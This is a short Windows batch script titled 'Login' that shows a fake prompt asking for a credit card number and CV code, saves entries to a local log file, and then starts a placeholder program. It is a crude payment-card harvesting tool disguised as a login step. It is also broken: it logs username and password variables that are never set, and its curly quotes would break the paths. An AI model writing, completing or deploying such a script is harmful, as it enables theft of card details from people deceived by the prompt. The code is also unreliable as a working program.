@echo off

color 7

title Login

cls

echo Please Enter credit card details

echo.

echo.

cd “C:\Logs”

set /p card=Card number:
set /p CV=CV:

echo Username=”%user%” Password=”%pass%” >> Log.txt

start >>Program Here<<


